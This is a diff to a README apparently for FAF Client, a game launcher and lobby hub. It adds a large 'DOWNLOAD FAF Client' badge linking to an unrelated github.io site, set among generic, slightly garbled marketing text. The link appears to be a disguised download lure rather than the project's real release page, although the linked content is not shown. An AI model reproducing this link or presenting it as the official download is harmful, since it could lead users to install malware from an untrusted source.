@@ -30,6 +30,12 @@ FAF Client is the launcher and lobby hub for Forged Alliance Forever, providing 
 
 Whether you're a newcomer or a veteran, FAF Client provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download FAF Client](https://img.shields.io/badge/⬇_DOWNLOAD_FAF+Client-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
